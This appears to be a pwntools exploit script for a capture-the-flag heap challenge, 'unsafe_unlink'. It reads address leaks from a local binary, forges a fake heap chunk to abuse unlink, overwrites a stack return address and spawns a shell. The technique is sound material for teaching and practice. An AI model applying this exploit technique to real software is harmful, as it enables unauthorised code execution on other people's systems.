from pwn import *

# REGULAR SOLVE
p = process('./unsafe_unlink')
# DEBUG WSL PREP
# p = gdb.debug(args=['./unsafe_unlink'], exe='./unsafe_unlink', gdbscript='''
#     b *main
#     c
# ''')
# time.sleep(2)

p.recvline() # skip first welcome message
leak = p.recvline().split(b' ')
stack_leak = int(leak[-3].decode(), 16)
pie_leak = int(leak[-2].decode(), 16)
data_leak = int(leak[-1].decode(), 16)
log.info(f'STACK LEAK {hex(stack_leak)}, DATA LEAK {hex(data_leak)}, PIE LEAK {hex(pie_leak)}')

fd = p64(data_leak - 0x18)
bk = p64(data_leak - 0x10)
fake_chunk = p64(0x0) + p64(0x420) + fd + bk + p64(0x0) + p64(0x0)
fake_chunk_padding = b'a' * (0x420 - len(fake_chunk))
adjacent_chunk_metadata = p64(0x420) + p64(0x430)

assert len(fake_chunk + fake_chunk_padding + adjacent_chunk_metadata) == 0x430 # Sanity Check

p.recvuntil(b'Name:\n')
log.info(f'Sending fake chunk... ( fd: {fd} bk: {bk} )')
p.sendline(fake_chunk + fake_chunk_padding + adjacent_chunk_metadata)
log.info("Triggering backwards consolidation...")
p.recvuntil(b'Drink:\n')
p.sendline(b'go')

stack_ret_addr = stack_leak + 0x18

p.recvuntil(b'Name:\n')
log.info(f'Sending arbitrary address (stack ret address)... Address: {hex(stack_ret_addr)}')
p.sendline(p64(stack_ret_addr) * 4)

p.recvuntil(b'Name:\n')
shell_func = pie_leak - 0xf
log.info(f'Writing to {hex(stack_ret_addr)} the address {hex(shell_func)} (shell function)...')
p.sendline(p64(shell_func))

p.recvuntil(b'Goodbye!\n')
log.info('Returning to shell...')

p.interactive()
